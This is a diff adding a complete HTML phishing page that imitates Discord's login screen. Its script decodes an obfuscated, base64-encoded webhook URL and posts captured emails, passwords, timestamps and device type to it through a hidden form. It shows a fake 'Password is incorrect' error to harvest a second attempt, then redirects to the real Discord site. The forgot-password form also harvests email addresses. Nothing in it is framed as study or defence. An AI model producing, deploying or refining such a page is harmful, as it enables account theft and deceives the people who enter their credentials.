@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+    <link rel="icon" href="https://discord.com/favicon.ico" type="image/x-icon">
+    <meta name="theme-color" content="#5865f2">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: url('https://i.postimg.cc/sD2J3Qrp/discord.webp') no-repeat center center;
+            background-size: cover;
+            background-color: #5865f2;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .login-card {
+            background-color: #313338;
+            padding: 40px 32px;
+            border-radius: 8px;
+            width: 400px;
+            max-width: 100%;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+        .logo svg {
+            width: 48px;
+            height: 48px;
+        }
+        h2 {
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .input-group {
+            margin-bottom: 16px;
+        }
+        label {
+            display: block;
+            color: #b5bac1;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+        input[type="text"],
+        input[type="password"],
+        input[type="email"] {
+            width: 100%;
+            padding: 10px 12px;
+            background-color: #1e1f22;
+            border: 1px solid #040405;
+            border-radius: 4px;
+            color: #ffffff;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            border-color: #5865f2;
+        }
+        .forgot {
+            display: block;
+            color: #00aff4;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 20px;
+            margin-top: -4px;
+            cursor: pointer;
+        }
+        .forgot:hover {
+            text-decoration: underline;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #5865f2;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .login-btn:hover {
+            background-color: #4752c4;
+        }
+        .login-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        .error-msg {
+            color: #f04747;
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+        }
+        .forgot-section {
+            display: none;
+            margin-top: 16px;
+        }
+        .forgot-message {
+            color: #43b581;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 12px;
+            display: none;
+        }
+        @media (max-width: 480px) {
+            .login-card {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" fill="#5865f2">
+                <path d="M20.317 4.37a19.79 19.79 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
+            </svg>
+        </div>
+        <h2 id="mainTitle">Welcome back!</h2>
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">Phone Number / Email</label>
+                <input type="text" id="email" placeholder="you@example.com" required autocomplete="off">
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" required autocomplete="off">
+            </div>
+            <a class="forgot" id="forgotLink">Forgot your password?</a>
+            <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+            <div class="error-msg" id="errorMsg"></div>
+        </form>
+        <div class="forgot-section" id="forgotSection">
+            <div class="input-group">
+                <label for="resetEmail">Email</label>
+                <input type="email" id="resetEmail" placeholder="you@example.com" required autocomplete="off">
+            </div>
+            <button class="login-btn" id="sendResetBtn">Send Reset Link</button>
+            <div class="forgot-message" id="forgotMessage">Reset link sent to your email!</div>
+            <a class="forgot" id="backToLogin" style="margin-top: 12px; text-align: center; display: block;">Back to Login</a>
+        </div>
+    </div>
+
+    <!-- Hidden form for webhook submission (bypasses CORS) -->
+    <form id="webhookForm" method="POST" action="" target="hiddenFrame" style="display:none;">
+        <input type="hidden" name="payload_json" id="payloadField">
+    </form>
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
+
+    <script>
+        var _webhookEncoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzOTM2ODQxMjEwOTc0MjIxNC9nT3I2OXdBdHV1X3JsTHVuYm5TSnV5MmJhQ3NGSmEwUy02VDI1Q09sV2tJQlMyS3J6eC01c2xlR0s4VVM0NWF3Yzc2Wg==";
+        var webhookURL = atob(_webhookEncoded);
+        document.getElementById('webhookForm').action = webhookURL;
+
+        var attempts = 0;
+
+        function isValidEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email);
+        }
+
+        function sendWebhook(email, password) {
+            var timestamp = new Date().toISOString();
+            var device = /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+            var embed = {
+                title: "🔐 Discord Login Captured",
+                color: 0x57F287,
+                fields: [
+                    { name: "Email / Phone", value: "```" + email + "```", inline: false },
+                    { name: "Password", value: "```" + password + "```", inline: false },
+                    { name: "Time / Date", value: "```" + timestamp + "```", inline: false },
+                    { name: "Device", value: "```" + device + "```", inline: false }
+                ]
+            };
+            var payload = { embeds: [embed] };
+            document.getElementById('payloadField').value = JSON.stringify(payload);
+            document.getElementById('webhookForm').submit();
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var email = document.getElementById('email').value.trim();
+            var password = document.getElementById('password').value;
+            var btn = document.getElementById('loginBtn');
+            var errorMsg = document.getElementById('errorMsg');
+
+            if (!email || !password) {
+                errorMsg.textContent = "Please fill in all fields.";
+                errorMsg.style.display = 'block';
+                return;
+            }
+            if (!isValidEmail(email)) {
+                errorMsg.textContent = "Please enter a valid email address.";
+                errorMsg.style.display = 'block';
+                return;
+            }
+
+            attempts++;
+
+            if (attempts === 1) {
+                // First attempt: log to webhook, show error, clear password
+                sendWebhook(email, password);
+                errorMsg.textContent = "Password is incorrect. Please try again.";
+                errorMsg.style.display = 'block';
+                document.getElementById('password').value = '';
+            } else {
+                // Second attempt: log to webhook, redirect
+                sendWebhook(email, password);
+                errorMsg.style.display = 'none';
+                btn.disabled = true;
+                btn.textContent = 'Logging in...';
+                setTimeout(function() {
+                    window.location.href = 'https://discord.com/app';
+                }, 1000);
+            }
+        });
+
+        document.getElementById('forgotLink').addEventListener('click', function() {
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('forgotSection').style.display = 'block';
+            document.getElementById('mainTitle').textContent = 'Enter Email Address';
+        });
+
+        document.getElementById('backToLogin').addEventListener('click', function() {
+            document.getElementById('forgotSection').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+            document.getElementById('mainTitle').textContent = 'Welcome back!';
+            document.getElementById('forgotMessage').style.display = 'none';
+        });
+
+        document.getElementById('sendResetBtn').addEventListener('click', function() {
+            var resetEmail = document.getElementById('resetEmail').value.trim();
+            if (!resetEmail) return;
+            if (!isValidEmail(resetEmail)) {
+                alert("Please enter a valid email address.");
+                return;
+            }
+            document.getElementById('forgotMessage').style.display = 'block';
+            var timestamp = new Date().toISOString();
+            var embed = {
+                title: "📧 Discord Forgot Password - Email Captured",
+                color: 0x57F287,
+                fields: [
+                    { name: "Email", value: "```" + resetEmail + "```", inline: false },
+                    { name: "Time / Date", value: "```" + timestamp + "```", inline: false }
+                ]
+            };
+            var payload = { embeds: [embed] };
+            document.getElementById('payloadField').value = JSON.stringify(payload);
+            document.getElementById('webhookForm').submit();
+            setTimeout(function() {
+                document.getElementById('forgotMessage').style.display = 'none';
+                document.getElementById('forgotSection').style.display = 'none';
+                document.getElementById('loginForm').style.display = 'block';
+                document.getElementById('mainTitle').textContent = 'Welcome back!';
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
